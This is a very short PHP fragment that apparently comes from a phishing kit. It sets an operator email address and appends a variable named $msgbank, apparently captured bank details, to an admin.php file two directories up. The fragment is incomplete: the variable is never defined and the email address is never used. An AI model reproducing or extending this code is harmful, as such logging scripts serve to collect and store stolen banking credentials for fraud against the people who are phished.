<?php

$yourmail  = 'yahyazaerru@gmail.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>